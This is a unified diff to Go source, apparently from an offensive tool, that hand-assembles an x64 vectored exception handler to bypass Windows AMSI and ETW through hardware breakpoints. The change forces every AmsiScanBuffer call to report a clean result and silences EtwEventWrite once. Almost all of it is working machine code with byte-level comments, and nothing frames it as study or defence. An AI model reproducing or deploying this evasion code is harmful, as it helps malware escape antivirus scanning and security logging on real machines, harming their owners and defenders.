@@ -137,13 +137,16 @@ var (
 // Handler logic (x64 Windows ABI, RCX = EXCEPTION_POINTERS*):
 //  1. Check ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP (0x80000004)
 //  2. Load ContextRecord pointer
-//  3. Compare ContextRecord->Rip against AMSI addr → redirect Rip to embedded
-//     "xor eax,eax; ret" gadget (returns S_OK to caller via native RET)
-//  4. Compare ContextRecord->Rip against ETW addr → same gadget redirect
-//     (returns 0/STATUS_SUCCESS via native RET)
-//  5. Clear Dr6
-//  6. Return EXCEPTION_CONTINUE_EXECUTION (-1)
-//  7. If no match → return EXCEPTION_CONTINUE_SEARCH (0)
+//  3. Compare ContextRecord->Rip against AMSI addr:
+//     - Write AMSI_RESULT_CLEAN (0) to output param at [Rsp+0x30] (dereferenced)
+//     - Redirect Rip to "xor eax,eax; ret" gadget (returns S_OK)
+//     - Keep Dr0 active (AMSI BP fires on every call for persistent protection)
+//  4. Compare ContextRecord->Rip against ETW addr:
+//     - Redirect Rip to same gadget (returns 0/STATUS_SUCCESS)
+//     - One-shot: disable Dr1 (clear Dr7 bit 2) to prevent repeated firing
+//       from Go runtime threads calling EtwEventWrite during GC/scheduling
+//  5. Clear Dr6, return EXCEPTION_CONTINUE_EXECUTION (-1)
+//  6. If no match → return EXCEPTION_CONTINUE_SEARCH (0)
 func buildNativeVEHHandler(amsiAddr, etwAddr uintptr) (handlerAddr uintptr, dataAddr uintptr, err error) {
 	// Allocate 24-byte data block (RW) for target addresses and gadget pointer
 	dataPtr, _, callErr := procVirtualAlloc.Call(
@@ -228,21 +231,42 @@ func buildNativeVEHHandler(amsiAddr, etwAddr uintptr) (handlerAddr uintptr, data
 	jneSkipAmsiOffset := len(code)
 	code = append(code, 0x00) // placeholder
 
-	// AMSI match: redirect execution to an embedded "xor eax,eax; ret" gadget.
-	// The gadget executes naturally via the CPU's RET instruction, returning
-	// S_OK (0) to AmsiScanBuffer's caller with correct stack unwinding.
+	// AMSI match: redirect execution to an embedded "xor eax,eax; ret" gadget
+	// and write AMSI_RESULT_CLEAN (0) to the output parameter.
+	//
+	// AmsiScanBuffer signature (6 params, x64 ABI):
+	//   RCX = amsiContext, RDX = buffer, R8 = length, R9 = contentName,
+	//   [RSP+0x28] = amsiSession, [RSP+0x30] = AMSI_RESULT* result
+	//
+	// At breakpoint entry, context.Rsp points to the stack AFTER the call
+	// instruction pushed the return address. The 6th param (AMSI_RESULT*)
+	// is at [RSP+0x30]. We dereference that pointer and write 0 to it.
+	//
+	// AMSI breakpoint stays ACTIVE (Dr7 bit 0 preserved) so it fires on
+	// every AmsiScanBuffer call. ETW is one-shot because Go runtime threads
+	// call EtwEventWrite frequently and repeated VEH invocations cause crashes.
+
+	// Load context.Rsp into rax: rax = [rbx+0x98]
+	code = append(code, 0x48, 0x8B, 0x83)             // mov rax, [rbx+0x98]
+	code = append(code, 0x98, 0x00, 0x00, 0x00)       // disp32 = 0x98 (Rsp)
+	// Load AMSI_RESULT* from [rax+0x30]: rax = [rax+0x30]
+	code = append(code, 0x48, 0x8B, 0x40, 0x30)       // mov rax, [rax+0x30]
+	// Null-check the pointer before dereferencing
+	code = append(code, 0x48, 0x85, 0xC0)             // test rax, rax
+	code = append(code, 0x74) // jz skip_result_write (rel8)
+	jzSkipResultOffset := len(code)
+	code = append(code, 0x00) // placeholder
+	// Write AMSI_RESULT_CLEAN (0) to *result: [rax] = 0
+	code = append(code, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00) // mov dword [rax], 0
+	// skip_result_write:
+	skipResultTarget := len(code)
+	code[jzSkipResultOffset] = byte(skipResultTarget - jzSkipResultOffset - 1)
+
 	// Load gadget address from data block: rax = [r13+0x10]
 	code = append(code, 0x49, 0x8B, 0x45, 0x10)       // mov rax, [r13+0x10]
 	// Set context.Rip to gadget address: [rbx+0xF8] = rax
 	code = append(code, 0x48, 0x89, 0x83)             // mov [rbx+disp32], rax
 	code = append(code, 0xF8, 0x00, 0x00, 0x00)       // disp32 = 0xF8 (Rip)
-	// Disable Dr0 (AMSI breakpoint) by clearing bit 0 of Dr7 in context
-	// so the breakpoint doesn't fire on subsequent calls from this thread.
-	code = append(code, 0x48, 0x8B, 0x83)             // mov rax, [rbx+0x70]
-	code = append(code, 0x70, 0x00, 0x00, 0x00)       // Dr7 offset
-	code = append(code, 0x48, 0x83, 0xE0, 0xFE)       // and rax, ~1 (clear bit 0)
-	code = append(code, 0x48, 0x89, 0x83)             // mov [rbx+0x70], rax
-	code = append(code, 0x70, 0x00, 0x00, 0x00)
 	// Clear Dr6: [rbx+0x68] = 0
 	code = append(code, 0x48, 0xC7, 0x83)             // mov qword [rbx+0x68], 0
 	code = append(code, 0x68, 0x00, 0x00, 0x00)
